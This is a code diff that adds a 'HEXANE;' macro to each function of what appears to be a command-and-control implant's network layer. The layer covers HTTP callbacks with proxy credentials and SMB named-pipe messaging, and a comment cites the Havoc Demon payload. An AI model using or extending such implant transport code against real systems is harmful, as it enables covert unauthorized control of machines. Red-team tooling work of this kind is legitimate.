@@ -5,6 +5,7 @@ namespace Network {
     namespace Http {
 
         BOOL HttpSendRequest(HINTERNET request, _stream **stream) {
+            HEXANE;
 
             DWORD read      = 0;
             DWORD in_length = 0;
@@ -75,6 +76,7 @@ namespace Network {
         }
 
         VOID DestroyRequestContext(_request_context *req_ctx) {
+            HEXANE;
 
             if (req_ctx) {
                 if (req_ctx->req_handle)    { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
@@ -88,6 +90,7 @@ namespace Network {
         }
 
         VOID DestroyProxyContext(_proxy_context *proxy_ctx) {
+            HEXANE;
 
             if (proxy_ctx) {
                 if (proxy_ctx->proxy_config.lpszProxy)          { Free(proxy_ctx->proxy_config.lpszProxy); }
@@ -97,6 +100,7 @@ namespace Network {
         }
 
         BOOL CreateRequestContext(_request_context *req_ctx) {
+            HEXANE;
 
             const auto address  = Ctx->transport.http->address;
             const auto port     = Ctx->transport.http->port;
@@ -130,6 +134,7 @@ namespace Network {
         }
 
         BOOL CreateProxyContext(_proxy_context *proxy_ctx, _request_context *req_ctx) {
+            HEXANE;
 
             auto proxy_info     = proxy_ctx->proxy_info;
             const auto username = Ctx->transport.http->proxy->username;
@@ -209,6 +214,7 @@ namespace Network {
         }
 
         BOOL HttpCallback(_stream **in, _stream *out) {
+            HEXANE;
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
             // TODO: reverting tokens during http operations
 
@@ -268,6 +274,7 @@ namespace Network {
     namespace Smb {
 
         VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
+            HEXANE;
 
             if (SmbSecAttr->sid)        { Ctx->win32.FreeSid(SmbSecAttr->sid); SmbSecAttr->sid = nullptr; }
             if (SmbSecAttr->sid_low)    { Ctx->win32.FreeSid(SmbSecAttr->sid_low); SmbSecAttr->sid_low = nullptr; }
@@ -276,6 +283,7 @@ namespace Network {
         }
 
         BOOL SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
+            HEXANE;
 
             SID_IDENTIFIER_AUTHORITY sid_auth   = SECURITY_WORLD_SID_AUTHORITY;
             SID_IDENTIFIER_AUTHORITY sid_label  = SECURITY_MANDATORY_LABEL_AUTHORITY;
@@ -330,6 +338,7 @@ namespace Network {
         }
 
         BOOL PipeRead(void *handle, _stream *in) {
+            HEXANE;
 
             uint32_t read   = 0;
             uint32_t total  = 0;
@@ -350,6 +359,7 @@ namespace Network {
         }
 
         BOOL PipeWrite(void *handle, _stream *out) {
+            HEXANE;
 
             uint32_t total = 0;
             uint32_t write = 0;
@@ -368,6 +378,7 @@ namespace Network {
         }
 
         BOOL PipeSend (_stream *out) {
+            HEXANE;
 
             SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
             SECURITY_ATTRIBUTES sec_attr    = { };
@@ -400,6 +411,7 @@ namespace Network {
         }
 
         BOOL PipeReceive(_stream** in) {
+            HEXANE;
 
             uint32_t peer_id    = 0;
             uint32_t msg_size   = 0;
